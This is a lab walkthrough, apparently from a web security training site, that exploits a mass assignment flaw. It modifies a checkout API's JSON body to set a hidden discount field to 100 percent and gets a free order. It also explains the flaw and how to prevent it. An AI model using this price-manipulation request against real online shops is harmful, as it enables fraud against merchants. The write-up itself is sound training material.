# Lab: Exploiting a Mass Assignment Vulnerability

## Lab Description

This lab is vulnerable to **Mass Assignment**. The API accepts user-controlled JSON data and automatically maps every supplied field to server-side objects without properly filtering which properties can be modified.

The hidden `chosen_discount.percentage` field can therefore be manipulated to apply an unauthorized **100% discount**, allowing the order to be placed for free.

**Objective:** Purchase the *Lightweight "l33t" Leather Jacket* using the mass assignment vulnerability.

---

## Steps to Solve

### 1. Add the target product to the cart.

---

### 2. Intercept the request to `/api/checkout`

Navigate to the cart and observe the API request:

```http
GET /api/checkout HTTP/2
```

The response returns JSON similar to:

```json
{
    "chosen_discount":{
        "percentage":0
    },
    "chosen_products":[
        {
            "product_id":"1",
            "name":"Lightweight \"l33t\" Leather Jacket",
            "quantity":1,
            "item_price":133700
        }
    ]
}
```

This reveals a hidden object named `chosen_discount`.

---

### 3. Test other HTTP methods

Send the request to **Repeater**.

Try:

```http
OPTIONS /api/checkout HTTP/2
```

Response:

```http
HTTP/2 405 Method Not Allowed
Allow: POST, GET
```

The endpoint only supports **GET** and **POST**.

---

### 4. Modify the checkout request

Take the JSON returned by the GET request and use it as the body of a **POST** request.

Original body:

```json
{
    "chosen_discount":{
        "percentage":0
    },
    "chosen_products":[
        {
            "product_id":"1",
            "name":"Lightweight \"l33t\" Leather Jacket",
            "quantity":1,
            "item_price":133700
        }
    ]
}
```

Change the discount percentage to **100**.

Modified request:

```http
POST /api/checkout HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/json

{
    "chosen_discount":{
        "percentage":100
    },
    "chosen_products":[
        {
            "product_id":"1",
            "name":"Lightweight \"l33t\" Leather Jacket",
            "quantity":1,
            "item_price":133700
        }
    ]
}
```

---

### 5. Send the request

The server responds with:

```http
HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
```

The order is accepted with the attacker-controlled discount.

---

### 6. Verify

Visit:

```
/cart/order-confirmation?order-confirmed=true
```

The lab is solved.

---

# Vulnerability Explanation

Mass Assignment occurs when an application automatically binds every user-supplied JSON property to internal server objects without using an allowlist.

Although the application intended `chosen_discount.percentage` to be managed only by the server, it trusted client input and accepted:

```json
{
    "chosen_discount":{
        "percentage":100
    }
}
```

As a result, the attacker could modify privileged properties and receive a 100% discount.

---

# Impact

- Unauthorized discounts
- Price manipulation
- Privilege escalation
- Business logic abuse
- Unauthorized modification of protected fields

---

# Prevention

- Use allowlists for bindable fields.
- Ignore server-controlled properties supplied by clients.
- Validate all incoming JSON fields.
- Keep sensitive values (prices, discounts, roles, balances) exclusively on the server.
- Reject unexpected JSON attributes instead of silently accepting them.

---
